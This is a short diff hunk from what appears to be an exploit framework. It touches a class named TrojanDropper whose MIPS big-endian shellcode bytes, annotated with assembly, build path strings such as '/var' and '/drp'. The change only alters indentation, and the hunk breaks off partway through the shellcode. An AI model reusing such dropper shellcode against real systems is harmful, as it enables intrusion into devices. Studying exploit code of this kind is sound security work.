@@ -26,8 +26,8 @@ class TrojanDropper:
     """
     shellcodes={}
     shellcodes[BigEndian] = string.join([
-    		"\x3c\x0f\x2f\x76", # lui	t7,0x2f76   "/v"
-    		"\x35\xef\x61\x72", # ori	t7,t7,0x6172 "ar"
+            "\x3c\x0f\x2f\x76", # lui	t7,0x2f76   "/v"
+            "\x35\xef\x61\x72", # ori	t7,t7,0x6172 "ar"
             "\xaf\xaf\xff\xf4", # sw    t7,-12(sp)
             "\x3c\x0e\x2f\x64", # lui   t6,0x2f64    "/d"
             "\x35\xce\x72\x70", # ori   t6,t6,0x7270 "rp"
